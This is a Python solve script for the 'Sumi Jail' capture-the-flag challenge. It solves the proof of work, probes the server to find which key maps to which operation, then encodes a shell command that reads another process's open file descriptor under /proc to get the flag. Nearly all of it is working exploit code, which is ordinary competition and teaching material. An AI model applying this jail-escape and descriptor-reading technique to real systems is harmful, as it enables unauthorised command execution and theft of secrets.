#!/usr/bin/env python3
# solve.py — Sumi Jail. usage: python3 solve.py HOST PORT
import hashlib, itertools, random, re, socket, sys

HOST, PORT = sys.argv[1], int(sys.argv[2])
CMD = "cat /proc/$(cat /run/holder.pid)/fd/3"

# --- proof of work (from the handout's solve_pow.py) ---
P = (1 << 2203) - 1
E = (P + 1) // 4


def pow_solve(challenge):
    _, depth, nonce = challenge.split(".")
    blob = b"".join(hashlib.sha512(b"sumi-pow-v1|" + bytes.fromhex(nonce) + bytes([i])).digest()
                    for i in range(5))
    x = int.from_bytes(blob, "big") % P
    for _ in range(int(depth)):
        r = pow(x, E, P)
        x = r if (r & 1) == (0 if r * r % P == x else 1) else P - r
    return format(x, "x")


# --- model of the register machine ---
PERMS = [dict(zip("wesd", p)) for p in itertools.permutations(("inc", "dbl", "dep", "exe"))]


def deposits(seq, m):
    """Bytes the server echoes as [0xNN] for key sequence seq under mapping m."""
    acc, out = 0, []
    for k in seq:
        if m[k] == "inc":
            acc += 1
        elif m[k] == "dbl":
            acc *= 2
        elif m[k] == "dep":
            out.append(acc & 0xFF)
            acc = 0
    return tuple(out)


def find_probe():
    """A short key sequence whose deposit trace is unique across all 24 mappings."""
    random.seed(1)
    while True:
        seq = "".join(random.choice("wesd") for _ in range(14))
        if len({deposits(seq, m) for m in PERMS}) == 24:
            return seq


def encode(cmd, m):
    """Build cmd byte by byte: inc for the top bit, then dbl (+inc) per bit, then dep."""
    k = {op: key for key, op in m.items()}
    out = ""
    for byte in cmd.encode():
        bits = bin(byte)[2:]
        out += k["inc"]
        for bit in bits[1:]:
            out += k["dbl"] + (k["inc"] if bit == "1" else "")
        out += k["dep"]
    return out + k["exe"]


def recv_until(s, marker):
    data = ""
    while marker not in data:
        chunk = s.recv(65536).decode(errors="replace")
        if not chunk:
            break
        data += chunk
    return data


s = socket.create_connection((HOST, PORT), timeout=30)
banner = recv_until(s, "answer:")
s.sendall(pow_solve(re.search(r"sumi1\.\d+\.[0-9a-f]+", banner).group(0)).encode() + b"\n")
recv_until(s, "two shots.")

# shot 1: identify the mapping from the echoed deposits
probe = find_probe()
s.sendall(probe.encode() + b"\n")
reply = recv_until(s, "[shot 2]").split("ops", 1)[1]
seen = tuple(int(h, 16) for h in re.findall(r"\[0x([0-9a-f]{2})\]", reply))
mapping = next(m for m in PERMS if deposits(probe, m) == seen)
print("mapping:", mapping)

# shot 2: run the command that reads the real flag
s.sendall(encode(CMD, mapping).encode() + b"\n")
s.settimeout(10)
out = ""
try:
    while not re.search(r"csaw\{[^}]*\}", out):
        chunk = s.recv(65536).decode(errors="replace")
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass
print(re.search(r"csaw\{[^}]*\}", out).group(0))
